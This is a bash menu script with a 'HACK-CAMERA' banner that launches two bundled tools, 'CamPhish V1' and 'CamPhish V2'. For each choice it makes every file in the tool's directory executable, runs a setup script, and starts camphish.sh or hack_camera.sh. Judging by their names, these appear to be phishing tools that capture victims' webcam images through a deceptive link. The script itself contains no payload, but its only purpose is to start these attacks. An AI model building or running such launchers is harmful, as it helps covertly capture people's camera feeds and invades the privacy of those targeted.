#!/bin/bash

# Define colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'


logo="    
${blue}  _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\

${green}                                               [By X PHANTOM (PH4N7OM)]

${RED}                                           [By SomniumN1 (Ashera12)]

${GREEN}     I Love Her .. lol          >> BiLaNazmi<< [SomniumN1]
 
"
# Display logo
echo -e "${logo}"     

# Define functions
function display_menu() {
  echo -e "${WHITE} ${logo}"
  echo -e "${CYAN}[1]${WHITE} CamPhish V1"
  echo -e "${CYAN}[2]${WHITE} CamPhish V2"
}

function run_camphish_v1() {
  clear
  echo -e "${WHITE} CamPhish V1..."
  sleep 5
  cd CamPhish
  clear
  echo -e "${MAGENTA} SOMNIUMN1 >>BILANAZMI<< ( ASHERA12 )${RESET}"
  sleep 3
  chmod +x *
  bash camphish.sh
}

function run_camphish_v2() {
  clear
  echo -e "${MAGENTA} CamPhish V2${RESET}"
  sleep 3
  cd HACK-CAMERA
  clear
  echo -e "${MAGENTA} installing The Tools ${RESET}"
  sleep 3
  chmod +x *
  ./setup
  echo -e "${MAGENTA} SOMNIUMN1 THAT'S NAME I LIKE ${RESET}"
  sleep 3
  bash hack_camera.sh
}

# Main program
while true; do
  clear
  display_menu
  read -p "Choose: " choice

  case $choice in
    1|01)
      run_camphish_v1
      ;;
    2|02)
      run_camphish_v2
      ;;
    *)
      clear
      echo -e "${CYAN} JUST HOPING TO BE HER HOPE :)${RESET}"
      sleep 1
      exit 0
      ;;
  esac
done